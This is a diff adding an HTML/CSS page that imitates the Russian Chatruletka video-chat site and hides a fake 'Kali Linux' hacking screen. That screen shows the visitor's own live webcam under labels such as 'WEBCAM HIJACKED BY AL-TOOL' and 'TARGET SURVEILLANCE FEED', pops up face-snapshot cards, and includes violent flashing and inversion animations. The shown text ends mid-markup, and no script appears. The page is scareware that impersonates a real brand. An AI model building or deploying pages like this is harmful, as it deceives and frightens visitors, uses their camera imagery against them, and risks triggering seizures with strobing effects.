@@ -1,0 +1,2100 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Chatruletka - Видеочат рулетка | Общайтесь со случайными людьми онлайн</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=PT+Sans:wght@400;700&family=Noto+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background-color: #c1d6e6;
+      font-family: 'PT Sans', 'Noto Sans', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+      user-select: none;
+    }
+
+    /* VIOLENT SCREEN SPASM & GLITCH */
+    .screen-spasm {
+      animation: violentSpasm 0.08s infinite alternate;
+    }
+
+    @keyframes violentSpasm {
+      0% { filter: invert(0) contrast(1); transform: translate(0, 0); }
+      25% { filter: invert(0.9) contrast(2) hue-rotate(180deg); transform: translate(-10px, 6px); }
+      50% { filter: brightness(3.5); transform: translate(8px, -6px); }
+      75% { filter: invert(0.4) contrast(3); transform: translate(-6px, 8px); }
+      100% { filter: invert(0.8); transform: translate(0, 0); }
+    }
+
+    /* PITCH BLACK FLICKER LAYER */
+    #blackoutLayer {
+      position: fixed;
+      inset: 0;
+      background: #000;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 999999;
+      transition: opacity 0.02s;
+    }
+
+    /* ==============================================================
+       1:1 AUTHENTIC CHATRULETKA DESKTOP INTERFACE (MATCHING SCREENSHOT)
+    ============================================================== */
+    .cr-layout {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      padding: 10px;
+      display: flex;
+      flex-direction: column;
+      box-sizing: border-box;
+      background-color: #c1d6e6;
+    }
+
+    /* TOP ROW: DUAL SPLIT VIDEOS */
+    .cr-videos-row {
+      flex: 1;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      min-height: 0;
+    }
+
+    .cr-video-frame {
+      position: relative;
+      overflow: hidden;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* LEFT VIDEO: TV NOISE + REVOLVER DRUM LOGO */
+    .cr-video-left {
+      background-color: #272727;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.36'/%3E%3C/svg%3E");
+    }
+
+    .cr-idle-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      z-index: 2;
+    }
+
+    .cr-revolver-logo {
+      width: 110px;
+      height: 110px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.4));
+    }
+
+    .cr-logo-title {
+      color: #ffffff;
+      font-size: 32px;
+      font-weight: 700;
+      font-family: 'PT Sans', Arial, sans-serif;
+      letter-spacing: -0.5px;
+      margin-top: 14px;
+      margin-bottom: 22px;
+      text-shadow: 0 2px 6px rgba(0, 0, 0, 0.6);
+    }
+
+    .cr-app-badges {
+      display: flex;
+      gap: 12px;
+    }
+
+    .cr-badge {
+      background: #000000;
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      border-radius: 8px;
+      padding: 6px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+      text-align: left;
+      user-select: none;
+      transition: transform 0.15s, border-color 0.15s;
+    }
+    .cr-badge:hover {
+      border-color: rgba(255, 255, 255, 0.5);
+      transform: translateY(-1px);
+    }
+
+    .badge-sub {
+      display: block;
+      font-size: 8.5px;
+      color: #94a3b8;
+      text-transform: uppercase;
+      font-weight: 700;
+      line-height: 1;
+      letter-spacing: 0.3px;
+    }
+
+    .badge-main {
+      display: block;
+      font-size: 15px;
+      color: #ffffff;
+      font-weight: 700;
+      font-family: 'PT Sans', Arial, sans-serif;
+      line-height: 1.25;
+    }
+
+    /* RADAR SEARCH IN STRANGER WINDOW */
+    .cr-radar-loader {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 0, 0, 0.85);
+      gap: 12px;
+      z-index: 5;
+    }
+
+    .radar-spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid rgba(255, 255, 255, 0.2);
+      border-top-color: #248bf2;
+      border-radius: 50%;
+      animation: crSpin 0.9s linear infinite;
+    }
+
+    /* RIGHT VIDEO: BLACK BACKGROUND + ROTATING DOTS SPINNER */
+    .cr-video-right {
+      background-color: #000000;
+    }
+
+    .cr-idle-spinner-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100%;
+    }
+
+    /* 12-DOTS ROTATING SPINNER MATCHING IMAGE 2 EXACTLY */
+    .cr-dots-spinner {
+      position: relative;
+      width: 54px;
+      height: 54px;
+      animation: crSpin 1.1s linear infinite;
+    }
+
+    @keyframes crSpin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .cr-dots-spinner .dot {
+      position: absolute;
+      width: 9px;
+      height: 9px;
+      background: #ffffff;
+      border-radius: 50%;
+      top: 50%;
+      left: 50%;
+      margin: -4.5px 0 0 -4.5px;
+    }
+
+    .cr-dots-spinner .d1  { transform: rotate(0deg) translate(22px); opacity: 1; }
+    .cr-dots-spinner .d2  { transform: rotate(30deg) translate(22px); opacity: 0.92; }
+    .cr-dots-spinner .d3  { transform: rotate(60deg) translate(22px); opacity: 0.84; }
+    .cr-dots-spinner .d4  { transform: rotate(90deg) translate(22px); opacity: 0.76; }
+    .cr-dots-spinner .d5  { transform: rotate(120deg) translate(22px); opacity: 0.68; }
+    .cr-dots-spinner .d6  { transform: rotate(150deg) translate(22px); opacity: 0.6; }
+    .cr-dots-spinner .d7  { transform: rotate(180deg) translate(22px); opacity: 0.52; }
+    .cr-dots-spinner .d8  { transform: rotate(210deg) translate(22px); opacity: 0.44; }
+    .cr-dots-spinner .d9  { transform: rotate(240deg) translate(22px); opacity: 0.36; }
+    .cr-dots-spinner .d10 { transform: rotate(270deg) translate(22px); opacity: 0.28; }
+    .cr-dots-spinner .d11 { transform: rotate(300deg) translate(22px); opacity: 0.2; }
+    .cr-dots-spinner .d12 { transform: rotate(330deg) translate(22px); opacity: 0.12; }
+
+    /* WATERMARK & OVERLAY */
+    .cr-watermark {
+      position: absolute;
+      top: 10px;
+      left: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      color: rgba(255, 255, 255, 0.6);
+      z-index: 4;
+      font-family: 'PT Sans', sans-serif;
+    }
+    .cr-watermark span { color: #40afff; }
+
+    .cr-stranger-tag {
+      position: absolute;
+      bottom: 10px;
+      left: 12px;
+      background: rgba(0, 0, 0, 0.65);
+      backdrop-filter: blur(4px);
+      padding: 4px 10px;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      z-index: 4;
+    }
+
+    /* BOTTOM ROW: CONTROLS (LEFT) + CHAT (RIGHT) */
+    /* BOTTOM ROW: 2 BUTTONS UNDER LEFT VIDEO */
+    .cr-bottom-row {
+      height: 72px;
+      display: flex;
+      align-items: center;
+      margin-top: 12px;
+    }
+
+    /* 2 MAIN BUTTONS GRID UNDER LEFT VIDEO */
+    .cr-buttons-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      width: calc(50% - 5px);
+      height: 100%;
+    }
+
+    .cr-btn {
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'PT Sans', 'Noto Sans', Arial, sans-serif;
+      user-select: none;
+      transition: filter 0.15s, transform 0.08s;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
+    }
+    .cr-btn:active {
+      transform: translateY(1px);
+    }
+
+    .cr-btn-start {
+      background: linear-gradient(180deg, #248bf2 0%, #1a5eb9 100%);
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 700;
+    }
+    .cr-btn-start:hover {
+      filter: brightness(1.08);
+    }
+
+    .cr-btn-stop {
+      background: #c2707e;
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 700;
+    }
+    .cr-btn-stop:hover {
+      background: #b56270;
+    }
+
+    /* CHAT BOX UNDER RIGHT VIDEO */
+    .cr-chat-box {
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    .cr-chat-body {
+      flex: 1;
+      padding: 6px 10px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .cr-sys-msg {
+      background: #edf3f8;
+      border-radius: 6px;
+      padding: 6px 10px;
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      font-size: 12px;
+      line-height: 1.35;
+      color: #3b4b5e;
+    }
+
+    .cr-sys-icon {
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .cr-chat-input-row {
+      height: 36px;
+      border-top: 1px solid #eef2f6;
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      gap: 8px;
+      background: #ffffff;
+    }
+
+    .cr-input {
+      flex: 1;
+      border: none;
+      outline: none;
+      font-size: 13px;
+      color: #333333;
+      background: transparent;
+      font-family: inherit;
+    }
+    .cr-input::placeholder {
+      color: #94a3b8;
+    }
+
+    .cr-emoji-btn {
+      background: none;
+      border: none;
+      font-size: 19px;
+      color: #94a3b8;
+      cursor: pointer;
+      outline: none;
+      line-height: 1;
+    }
+    .cr-emoji-btn:hover {
+      color: #64748b;
+    }
+
+    .msg-stranger {
+      background: #e8eff5;
+      padding: 5px 9px;
+      border-radius: 6px;
+      font-size: 12.5px;
+      color: #1e293b;
+      align-self: flex-start;
+      max-width: 90%;
+    }
+
+    .msg-me {
+      background: #248bf2;
+      color: #ffffff;
+      padding: 5px 9px;
+      border-radius: 6px;
+      font-size: 12.5px;
+      align-self: flex-end;
+      max-width: 90%;
+    }
+
+    /* FLASH LAYER */
+    #flash {
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 100000;
+      transition: opacity 0.05s ease-out;
+    }
+
+    /* ==============================================================
+       REAL KALI LINUX TERMINAL (100% AUTHENTIC GUI & SHELL OUTPUT)
+    ============================================================== */
+    #fullscreenTerminal {
+      position: fixed;
+      inset: 0;
+      background: #0c1017;
+      z-index: 99990;
+      display: none;
+      flex-direction: column;
+      font-family: 'JetBrains Mono', 'DejaVu Sans Mono', Consolas, monospace;
+      overflow: hidden;
+    }
+
+    /* KALI LINUX WINDOW TITLEBAR */
+    .kali-titlebar {
+      background: #161b26;
+      border-bottom: 1px solid #232c3d;
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: #cbd5e1;
+      font-size: 12.5px;
+      flex-shrink: 0;
+    }
+
+    .window-controls {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .win-btn {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      display: inline-block;
+    }
+    .win-close { background: #ff5f56; }
+    .win-min { background: #ffbd2e; }
+    .win-max { background: #27c93f; }
+
+    /* TERMINAL WORKSPACE */
+    .kali-viewport {
+      flex: 1;
+      position: relative;
+      display: flex;
+      overflow: hidden;
+      min-height: 0;
+    }
+
+    /* AUTHENTIC BASH STREAM */
+    #termConsoleOutput {
+      flex: 1;
+      padding: 16px 20px;
+      overflow-y: scroll;
+      font-size: 12.5px;
+      line-height: 1.55;
+      color: #d1d5db;
+      white-space: pre-wrap;
+      word-break: break-all;
+      background: #0c1017;
+      margin-right: 340px; /* Space for live camera stream */
+    }
+
+    @media (max-width: 860px) {
+      #termConsoleOutput {
+        margin-right: 0;
+        padding-top: 230px;
+      }
+    }
+
+    #termConsoleOutput::-webkit-scrollbar { width: 6px; }
+    #termConsoleOutput::-webkit-scrollbar-thumb { background: #1f293d; border-radius: 3px; }
+
+    /* AUTHENTIC KALI PROMPT COLORS */
+    .k-prompt { color: #38bdf8; font-weight: 700; }
+    .k-user { color: #f43f5e; font-weight: 800; }
+    .k-path { color: #38bdf8; font-weight: 700; }
+    .k-cmd { color: #ffffff; font-weight: 700; }
+    .k-green { color: #22c55e; }
+    .k-red { color: #ef4444; font-weight: 700; }
+    .k-yellow { color: #eab308; }
+    .k-cyan { color: #06b6d4; }
+    .k-dim { color: #64748b; }
+    .k-banner { color: #00f0ff; font-weight: 800; line-height: 1.25; }
+    .k-altool {
+      color: #ff3b30;
+      font-weight: 800;
+      display: block;
+      line-height: 1.15;
+      font-size: 11px;
+      text-shadow: 0 0 10px rgba(255, 59, 48, 0.5);
+    }
+    .k-breach-box {
+      border: 1px solid #ef4444;
+      background: rgba(239, 68, 68, 0.15);
+      color: #ff4d4d;
+      font-weight: 900;
+      padding: 8px 12px;
+      margin: 8px 0;
+      border-radius: 6px;
+      box-shadow: 0 0 20px rgba(239, 68, 68, 0.35);
+      letter-spacing: 0.5px;
+      line-height: 1.4;
+    }
+
+    /* FLOATING SURVEILLANCE WEBCAM (YOUR LIVE FACE FEED) */
+    .term-camera-float {
+      position: absolute;
+      top: 14px;
+      right: 18px;
+      width: 320px;
+      background: rgba(15, 21, 32, 0.95);
+      border: 2px solid #ef4444;
+      border-radius: 12px;
+      padding: 12px;
+      box-shadow: 0 0 35px rgba(239, 68, 68, 0.35);
+      z-index: 50;
+      backdrop-filter: blur(10px);
+    }
+
+    @media (max-width: 860px) {
+      .term-camera-float {
+        top: 10px;
+        right: 10px;
+        left: 10px;
+        width: auto;
+      }
+    }
+
+    .term-cam-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      font-weight: 800;
+      color: #ef4444;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+    }
+
+    .term-cam-viewport {
+      width: 100%;
+      aspect-ratio: 4/3;
+      background: #000;
+      border-radius: 8px;
+      overflow: hidden;
+      position: relative;
+      border: 1px solid rgba(239, 68, 68, 0.4);
+    }
+
+    #liveFaceVideo {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      filter: contrast(1.1) brightness(0.95);
+    }
+
+    .scan-reticle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 65%;
+      height: 72%;
+      border: 2px solid #ef4444;
+      border-radius: 8px;
+      box-shadow: 0 0 15px #ef4444;
+      pointer-events: none;
+    }
+
+    .scan-reticle::before {
+      content: 'ID: MOS KELDI 99.8%';
+      position: absolute;
+      top: -22px;
+      left: 0;
+      background: #ef4444;
+      color: #fff;
+      font-size: 9.5px;
+      font-weight: 800;
+      padding: 2px 6px;
+      border-radius: 3px;
+      white-space: nowrap;
+    }
+
+    .scan-laser {
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: #ef4444;
+      box-shadow: 0 0 12px #ef4444;
+      animation: laserSlide 1.2s infinite ease-in-out;
+    }
+
+    @keyframes laserSlide {
+      0% { top: 0%; opacity: 0.2; }
+      50% { top: 96%; opacity: 1; }
+      100% { top: 0%; opacity: 0.2; }
+    }
+
+    .term-cam-meta {
+      font-size: 10.5px;
+      line-height: 1.55;
+      color: #fca5a5;
+      margin-top: 8px;
+    }
+
+    /* 5 SCATTERED TARGET FACE SNAPSHOTS */
+    .target-snapshot-card {
+      position: absolute;
+      width: 220px;
+      background: rgba(13, 17, 23, 0.95);
+      border: 2px solid #ef4444;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(239, 68, 68, 0.7);
+      z-index: 99995;
+      animation: popSnapshot 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      backdrop-filter: blur(8px);
+      pointer-events: none;
+    }
+
+    @keyframes popSnapshot {
+      0% { transform: scale(0.3) rotate(-6deg); opacity: 0; }
+      70% { transform: scale(1.06) rotate(2deg); opacity: 1; }
+      100% { transform: scale(1) rotate(0deg); opacity: 1; }
+    }
+
+    .snap-header {
+      background: #ef4444;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 3px 6px;
+      display: flex;
+      justify-content: space-between;
+      letter-spacing: 0.5px;
+    }
+
+    .snap-body {
+      position: relative;
+      width: 100%;
+      height: 140px;
+      background: #000;
+    }
+
+    .snap-body canvas {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      filter: contrast(1.15) brightness(0.95);
+    }
+
+    .snap-overlay {
+      position: absolute;
+      inset: 0;
+      border: 1px dashed rgba(239, 68, 68, 0.6);
+      pointer-events: none;
+    }
+
+    .snap-tag {
+      position: absolute;
+      bottom: 4px;
+      left: 4px;
+      background: rgba(0, 0, 0, 0.85);
+      color: #22c55e;
+      font-size: 9px;
+      font-weight: 800;
+      padding: 2px 4px;
+      border-radius: 2px;
+      font-family: monospace;
+    }
+
+    .snap-footer {
+      padding: 4px 6px;
+      font-size: 9.5px;
+      color: #cbd5e1;
+      background: #0d1117;
+      border-top: 1px solid rgba(239, 68, 68, 0.3);
+      display: flex;
+      justify-content: space-between;
+      font-family: monospace;
+    }
+
+    /* IPHONE SYSTEM ALERT MODAL (DOES NOT BLUR OR OBSCURE BACKGROUND) */
+    .ios-alert-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 999999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      animation: iosFadeIn 0.22s ease-out;
+    }
+
+    @keyframes iosFadeIn {
+      0% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+
+    .ios-alert-box {
+      width: 272px;
+      background: rgba(38, 38, 40, 0.92);
+      backdrop-filter: blur(30px) saturate(190%);
+      -webkit-backdrop-filter: blur(30px) saturate(190%);
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.75), 0 0 0 0.5px rgba(255, 255, 255, 0.15);
+      text-align: center;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      animation: iosPop 0.24s cubic-bezier(0.175, 0.885, 0.32, 1.25);
+    }
+
+    @keyframes iosPop {
+      0% { transform: scale(1.18); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .ios-alert-content {
+      padding: 19px 16px 17px;
+    }
+
+    .ios-alert-title {
+      font-size: 17px;
+      font-weight: 600;
+      color: #ffffff;
+      margin-bottom: 4px;
+      letter-spacing: -0.4px;
+    }
+
+    .ios-alert-message {
+      font-size: 13px;
+      line-height: 1.35;
+      color: #ebebf5;
+      font-weight: 400;
+      letter-spacing: -0.15px;
+    }
+
+    .ios-alert-actions {
+      display: flex;
+      border-top: 0.5px solid rgba(255, 255, 255, 0.18);
+      height: 44px;
+    }
+
+    .ios-btn {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      font-size: 17px;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.12s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .ios-btn:active {
+      background: rgba(255, 255, 255, 0.12);
+    }
+
+    .ios-btn-cancel {
+      color: #0a84ff;
+      font-weight: 400;
+      border-right: 0.5px solid rgba(255, 255, 255, 0.18);
+    }
+
+    .ios-btn-ok {
+      color: #0a84ff;
+      font-weight: 600;
+    }
+
+    .ios-shake {
+      animation: iosShake 0.4s ease-in-out !important;
+    }
+
+    @keyframes iosShake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-9px); }
+      40%, 80% { transform: translateX(9px); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- FLICKER & FLASH LAYERS -->
+  <div id="blackoutLayer"></div>
+  <div id="flash"></div>
+
+  <!-- ==============================================================
+       1:1 AUTHENTIC CHATRULETKA INTERFACE (MATCHING USER SCREENSHOT)
+  ============================================================== -->
+  <div class="cr-layout">
+    <!-- TOP ROW: 2 SPLIT VIDEO FRAMES -->
+    <div class="cr-videos-row">
+      <!-- LEFT VIDEO: STRANGER / IDLE REVOLVER DRUM -->
+      <div class="cr-video-frame cr-video-left" id="strangerBox">
+        <!-- IDLE SCREEN (TV STATIC + REVOLVER DRUM LOGO + BADGES) -->
+        <div class="cr-idle-screen" id="idleScreen">
+          <div class="cr-revolver-logo">
+            <!-- 100% Authentic Revolver Drum Silhouette -->
+            <svg width="105" height="105" viewBox="0 0 100 100" fill="#ffffff">
+              <path fill-rule="evenodd" clip-rule="evenodd" d="M50 0C53 0 55.8 1.4 57.5 3.8C61.3 2.9 65.3 3.3 68.8 5C71.8 2.8 75.7 2.1 79.3 3.1C82.8 6.6 84.8 11.2 84.9 16.1C88.4 17.5 91.3 20 93.1 23.3C94.2 26.9 93.4 30.8 91.2 33.8C92.9 37.3 93.3 41.3 92.4 45.1C94.8 46.8 96.2 49.6 96.2 52.6C96.2 55.6 94.8 58.4 92.4 60.1C93.3 63.9 92.9 67.9 91.2 71.4C93.4 74.4 94.2 78.3 93.1 81.9C91.3 85.2 88.4 87.7 84.9 89.1C84.8 94 82.8 98.6 79.3 102.1C75.7 103.1 71.8 102.4 68.8 100.2C65.3 101.9 61.3 102.3 57.5 101.4C55.8 103.8 53 105.2 50 105.2C47 105.2 44.2 103.8 42.5 101.4C38.7 102.3 34.7 101.9 31.2 100.2C28.2 102.4 24.3 103.1 20.7 102.1C17.2 98.6 15.2 94 15.1 89.1C11.6 87.7 8.7 85.2 6.9 81.9C5.8 78.3 6.6 74.4 8.8 71.4C7.1 67.9 6.7 63.9 7.6 60.1C5.2 58.4 3.8 55.6 3.8 52.6C3.8 49.6 5.2 46.8 7.6 45.1C6.7 41.3 7.1 37.3 8.8 33.8C6.6 30.8 5.8 26.9 6.9 23.3C8.7 20 11.6 17.5 15.1 16.1C15.2 11.2 17.2 6.6 20.7 3.1C24.3 2.1 28.2 2.8 31.2 5C34.7 3.3 38.7 2.9 42.5 3.8C44.2 1.4 47 0 50 0ZM50 43C53.9 43 57 46.1 57 50C57 53.9 53.9 57 50 57C46.1 57 43 53.9 43 50C43 46.1 46.1 43 50 43ZM50 17C54.4 17 58 20.6 58 25C58 29.4 54.4 33 50 33C45.6 33 42 29.4 42 25C42 20.6 45.6 17 50 17ZM71.6 29.4C76 29.4 79.6 33 79.6 37.4C79.6 41.8 76 45.4 71.6 45.4C67.2 45.4 63.6 41.8 63.6 37.4C63.6 33 67.2 29.4 71.6 29.4ZM71.6 54.6C76 54.6 79.6 58.2 79.6 62.6C79.6 67 76 70.6 71.6 70.6C67.2 70.6 63.6 67 63.6 62.6C63.6 58.2 67.2 54.6 71.6 54.6ZM50 67C54.4 67 58 70.6 58 75C58 79.4 54.4 83 50 83C45.6 83 42 79.4 42 75C42 70.6 45.6 67 50 67ZM28.4 54.6C32.8 54.6 36.4 58.2 36.4 62.6C36.4 67 32.8 70.6 28.4 70.6C24 70.6 20.4 67 20.4 62.6C20.4 58.2 24 54.6 28.4 54.6ZM28.4 29.4C32.8 29.4 36.4 33 36.4 37.4C36.4 41.8 32.8 45.4 28.4 45.4C24 45.4 20.4 41.8 20.4 37.4C20.4 33 24 29.4 28.4 29.4Z"/>
+            </svg>
+          </div>
+          <div class="cr-logo-title">Chatruletka</div>
+          <div class="cr-app-badges">
+            <div class="cr-badge">
+              <svg width="22" height="22" viewBox="0 0 24 24"><path fill="#EA4335" d="M3.6 1.4L13.1 11 3.6 20.6c-.4-.4-.6-1.1-.6-2V3.4c0-.9.2-1.6.6-2z"/><path fill="#FBBC04" d="M16.5 7.6L13.1 11l3.4 3.4 3.9-2.2c1.3-.7 1.3-1.8 0-2.5l-3.9-2.1z"/><path fill="#4285F4" d="M3.6 1.4c.5-.4 1.3-.3 1.9.1l11 6.1L13.1 11 3.6 1.4z"/><path fill="#34A853" d="M13.1 11l3.4 3.4-11 6.1c-.6.4-1.4.5-1.9.1L13.1 11z"/></svg>
+              <div>
+                <span class="badge-sub">ДОСТУПНО В</span>
+                <span class="badge-main">Google Play</span>
+              </div>
+            </div>
+            <div class="cr-badge">
+              <svg width="20" height="20" viewBox="0 0 170 170" fill="#ffffff"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.7-3.04-7.58-7.7-11.64-13.99-6.42-9.88-11.39-21.2-14.9-33.95-3.52-12.76-5.27-24.81-5.27-36.17 0-14.13 3.42-26.04 10.27-35.73 6.85-9.69 15.42-14.65 25.71-14.89 4.35 0 9.29 1.14 14.83 3.43 5.54 2.28 9.29 3.48 11.25 3.59 1.74 0 5.69-1.25 11.87-3.75 6.18-2.5 11.53-3.64 16.06-3.43 11.96.65 21.64 5.38 29.04 14.2-10.44 6.31-15.55 15.17-15.34 26.58.22 8.92 3.64 16.36 10.27 22.34 6.63 5.98 14.52 9.35 23.66 10.12-2.17 6.74-4.78 13.37-7.82 19.89zm-32.61-105.74c0-7.07 2.58-13.78 7.74-20.13 5.16-6.36 11.53-10.22 19.11-11.58.11 1.2.16 2.18.16 2.94 0 6.96-2.72 13.75-8.15 20.38-5.43 6.63-12.01 10.49-19.74 11.58-.22-.98-.33-2.05-.33-3.21z"/></svg>
+              <div>
+                <span class="badge-sub">Загрузите в</span>
+                <span class="badge-main">App Store</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- SEARCHING RADAR -->
+        <div class="cr-radar-loader" id="strangerLoader" style="display:none;">
+          <div class="radar-spinner"></div>
+          <div style="font-size:16px; font-weight:700; color:#fff;">Поиск собеседника...</div>
+          <div style="font-size:12px; color:#aaa;" id="searchTimer">00:03</div>
+        </div>
+
+        <!-- REAL CONNECTED STRANGER VIDEO -->
+        <video id="strangerVideo" autoplay playsinline muted loop style="display:none; width:100%; height:100%; object-fit:cover;"></video>
+        <!-- FALLBACK CANVAS -->
+        <canvas id="strangerCanvas" width="640" height="480" style="display:none; width:100%; height:100%; object-fit:cover;"></canvas>
+
+        <!-- WATERMARK & OVERLAY -->
+        <div class="cr-watermark" id="strangerWatermark" style="display:none;">chat<span>ruletka</span>.com</div>
+        <div class="cr-stranger-tag" id="strangerOverlayBar" style="display:none;">
+          <span id="strangerTitle">Собеседник</span>
+          <span style="opacity:0.5;">|</span>
+          <span id="strangerPing">19 ms</span>
+        </div>
+      </div>
+
+      <!-- RIGHT VIDEO: USER WEBCAM / IDLE DOTS SPINNER -->
+      <div class="cr-video-frame cr-video-right" id="userBox">
+        <!-- 12-DOTS ROTATING SPINNER (EXACT REPLICA OF SCREENSHOT) -->
+        <div class="cr-idle-spinner-wrap" id="userSpinner">
+          <div class="cr-dots-spinner">
+            <div class="dot d1"></div><div class="dot d2"></div><div class="dot d3"></div>
+            <div class="dot d4"></div><div class="dot d5"></div><div class="dot d6"></div>
+            <div class="dot d7"></div><div class="dot d8"></div><div class="dot d9"></div>
+            <div class="dot d10"></div><div class="dot d11"></div><div class="dot d12"></div>
+          </div>
+        </div>
+
+        <!-- LIVE WEBCAM VIDEO -->
+        <video id="localVideo" autoplay playsinline muted style="display:none; width:100%; height:100%; object-fit:cover; transform:scaleX(-1);"></video>
+      </div>
+    </div>
+
+    <!-- BOTTOM ROW: 2 MAIN BUTTONS (START/NEXT and STOP) -->
+    <div class="cr-bottom-row">
+      <div class="cr-buttons-grid">
+        <button type="button" class="cr-btn cr-btn-start" id="startBtn">Старт</button>
+        <button type="button" class="cr-btn cr-btn-stop" id="stopBtn">Стоп</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==============================================================
+       AUTHENTIC FULLSCREEN KALI LINUX TERMINAL
+  ============================================================== -->
+  <div id="fullscreenTerminal">
+    <!-- WINDOW TITLEBAR (GNOME/XFCE KALI STYLE) -->
+    <div class="kali-titlebar">
+      <div class="window-controls">
+        <span class="win-btn win-close"></span>
+        <span class="win-btn win-min"></span>
+        <span class="win-btn win-max"></span>
+      </div>
+      <div>root@kali: ~ (bash)</div>
+      <div style="font-size:11px; color:#64748b;">x86_64 // PTS/1</div>
+    </div>
+
+    <div class="kali-viewport">
+      <!-- BASH CONSOLE STREAM -->
+      <div id="termConsoleOutput"></div>
+
+      <!-- SURVEILLANCE CAMERA (YOUR LIVE WEBCAM) -->
+      <div class="term-camera-float">
+        <div class="term-cam-header">
+          <span>SURV_WEBCAM_STREAM</span>
+          <span>LIVE ●</span>
+        </div>
+
+        <div class="term-cam-viewport">
+          <video id="liveFaceVideo" autoplay playsinline muted></video>
+          <div class="scan-reticle">
+            <div class="scan-laser"></div>
+          </div>
+        </div>
+
+        <div class="term-cam-meta">
+          [TARGET SURVEILLANCE FEED]<br>
+          Status: WEBCAM HIJACKED BY AL-TOOL<br>
+          Biometric Match: 99.8% CONFIRMED<br>
